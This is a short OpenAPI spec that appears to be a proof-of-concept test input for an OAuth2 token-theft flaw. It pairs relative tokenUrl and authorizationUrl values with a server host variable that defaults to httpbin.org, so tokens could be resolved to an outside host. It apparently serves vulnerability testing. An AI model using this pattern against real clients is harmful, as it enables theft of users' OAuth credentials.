{
  "openapi": "3.0.3",
  "info": {
    "title": "Z2463 OAuth Token Steal PoC",
    "version": "1.0.0",
    "description": "Test spec for OAuth2 relative tokenUrl resolution"
  },
  "servers": [
    {
      "url": "https://{apihost}/api/v1",
      "description": "API Server",
      "variables": {
        "apihost": {
          "default": "httpbin.org",
          "description": "API host"
        }
      }
    }
  ],
  "paths": {
    "/users": {
      "get": {
        "operationId": "listUsers",
        "summary": "List users",
        "description": "Returns a list of users",
        "security": [
          {
            "oauth2_scheme": [
              "read:users"
            ]
          }
        ],
        "responses": {
          "200": {
            "description": "Success",
            "content": {
              "application/json": {
                "schema": {
                  "type": "array",
                  "items": {
                    "type": "object",
                    "properties": {
                      "id": {
                        "type": "integer"
                      },
                      "name": {
                        "type": "string"
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  },
  "components": {
    "securitySchemes": {
      "oauth2_scheme": {
        "type": "oauth2",
        "flows": {
          "authorizationCode": {
            "authorizationUrl": "/oauth/authorize",
            "tokenUrl": "/oauth/token",
            "scopes": {
              "read:users": "Read users"
            }
          }
        }
      }
    }
  }
}